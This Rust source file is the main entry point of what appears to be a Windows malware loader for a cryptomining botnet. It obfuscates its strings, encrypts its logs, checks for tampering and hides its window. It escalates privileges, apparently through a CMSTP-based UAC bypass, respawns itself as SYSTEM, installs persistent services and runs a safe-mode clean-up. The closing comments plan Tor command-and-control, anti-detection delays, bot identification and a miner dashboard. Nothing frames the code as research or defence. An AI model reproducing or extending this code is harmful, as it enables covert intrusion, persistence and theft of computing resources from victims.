#![windows_subsystem = "windows"]

use lazy_static::lazy_static;
use loader_vars::constants::{ initial_log_directory, loader_service_name, system_log_directory };
use safemode::{ runner::clean_up, utils::{ is_safe_mode, safemode_fail_safe } };
use service::{
    runner::start_service,
    utils::{
        get_service_install_state,
        install_initial_service,
        install_system_service,
        ServiceInstallState,
    },
};
use shared::{
    constants::logs_encryption_key,
    logs::logger::Logger,
    uac::{
        checks::{ is_elevated, is_system },
        impersonate_admin::{ open_self_as_admin, try_kill_cmstp },
    },
    utils::{
        anti_tampering::is_clean,
        config::load_mib_config,
        functions::{
            exit_1,
            get_current_exe,
            is_running_from_system32,
            try_spawn_program_as_system,
        },
    },
};
use windows_service_detector::is_running_as_windows_service;
use std::{ sync::Mutex, thread };
use obfstr::obfstr as s;

mod network;
mod service;
mod safemode;

lazy_static! {
    pub static ref LOGGER: Mutex<Option<Logger>> = Mutex::new(None);
}

#[macro_export]
macro_rules! log_internal {
    ($level:expr, $s:expr) => {
        {
        match &*$crate::LOGGER.lock().unwrap() {
            Some(logger) => {
                logger.log($level, s!($s));
                // println!("{:#?}",$s);
            }
            None => {}
        }
        }
    };

    (
        $level:expr,
        $fmt:expr,
        $($arg:tt)*
    ) => {
        {
            match &*$crate::LOGGER.lock().unwrap() {
                Some(logger) => {
                logger.log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
                // println!("{}{:#?}", $fmt, $($arg)*);
            }
            None => {}
        }
        }
    };
}
#[macro_export]
macro_rules! info {
    ($s:expr) => {
        crate::log_internal!(s!("INFO"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("INFO"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! warn {
    ($s:expr) => {
        $crate::log_internal!(s!("WARN"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("WARN"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! err {
    ($s:expr) => {
        $crate::log_internal!(s!("ERROR"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
           $crate::log_internal!(s!("ERROR"), $fmt, $($arg)*
        )
    };
}
#[macro_export]
macro_rules! verbose {
    ($s:expr) => {
        $crate::log_internal!(s!("VERBOSE"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("VERBOSE"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! tag {
    ($s:expr) => {
        $crate::log_internal!(s!("TAG"), $s)
    };
}

fn main() {
    let is_running_from_system_dir = is_running_from_system32();
    let log_directory = match is_running_from_system_dir {
        true => { system_log_directory() }
        false => { initial_log_directory() }
    };
    if let Ok(logger) = Logger::new(log_directory, logs_encryption_key()) {
        let mut lock = LOGGER.lock().unwrap();
        *lock = Some(logger);
    }
    info!("Init");

    if !is_clean() {
        tag!("NOT-CLEAN");
        exit_1();
    }

    let mib_config = load_mib_config(false);

    let is_elevated = is_elevated().unwrap_or_else(|error| {
        err!("is_elevated Error, assuming false: ", error);
        false
    });

    if !is_elevated {
        if !mib_config.clean_up_done {
            if
                let Ok(out) = get_service_install_state(
                    &loader_service_name(),
                    get_current_exe().to_str().unwrap()
                )
            {
                match out.0 {
                    ServiceInstallState::ExistsSameExe => {
                        tag!("DISMISS-ELEVATE-CLEAN-UP-IN-PROGRESS");
                        exit_1();
                    }
                    _ => {}
                }
            }
        }

        tag!("ELEVATE");

        if let Err(error) = open_self_as_admin() {
            err!("open_self_as_admin Error: ", error);
        }
        exit_1();
    }
    let is_system = is_system().unwrap_or_else(|error| {
        err!("is_system Error, assuming false: ", error);
        false
    });

    if is_system {
        if is_safe_mode() {
            tag!("CLEANUP");
            if let Err(error) = clean_up() {
                err!("clean_up Error: ", error);
                safemode_fail_safe();
            }
        }
    }

    let is_service = is_running_as_windows_service().unwrap_or_else(|error| {
        err!("is_running_as_windows_service Error, assuming true:", error);
        true
    });
    if is_service {
        if let Err(error) = start_service() {
            err!("start_service Error: ", error);
        }
        exit_1()
    } else {
        if is_running_from_system_dir {
            if is_system {
                tag!("SYS-SERVICE-INSTALL");

                if let Err(error) = install_system_service() {
                    err!("install_system_service Error: ", error);
                }
                exit_1();
            } else {
                tag!("LAUNCH-SYS-SERVICE-INSTALL");
                if
                    let Err(error) = try_spawn_program_as_system(
                        get_current_exe().to_str().unwrap(),
                        None
                    )
                {
                    err!("try_spawn_program_as_system Error: ", error);
                }
                exit_1();
            }
        } else {
            if !mib_config.clean_up_done {
                tag!("INITIAL-SERVICE-INSTALL");
                let cmstp_cleanup_handle = thread::spawn(move || {
                    if let Err(error) = try_kill_cmstp() {
                        err!("try_kill_cmstp Error: ", error);
                    }
                });
                if let Err(error) = install_initial_service() {
                    err!("install_initial_service Error: ", error);
                }

                let _ = cmstp_cleanup_handle.join();
                exit_1();
            } else {
                tag!("NON-SERVICE-WITH-ADMIN-AFTER-CLEAN");
                warn!("not expected");
                exit_1();
            }
        }
    }
}

//? code run config in tor
//? code post cleanup
//? in tor handler modify to read data read the first data if exists and other native types sent to not error
//? sparse out pre install
//? if cannot connect to tor - run prewritten runconfig ( for miner etc ) still needed
//? code constant id getting // impl mother board serial and constant ID making and add actual values themselves in the bot handler
// in logger setup so that we save last log and if identical - we use (count) that repeats - fix for panic and huuuge bug when sizes get too big from some errors too much | somehow else prevent logger for making TOO BIG logs SIZE
// add better anti tampering
// code inf cleanup
// rewrite everything where we get checks as variables and then each call is just a combination of checks, and they are ordered by the order of how we decide
// improve clean up a little to not look dirty
// add sleep in between for anti detect
// fix tor handler logger abomination

//? in server verify bots by regenerating the constant id from botstate values and running some other checks AND if not match just IGNORE the bot - after verification we store its data

//* TEST AND TRY EACH SCENARIO IN VM UP TO RUNNING MINER DASHBOARD FULL
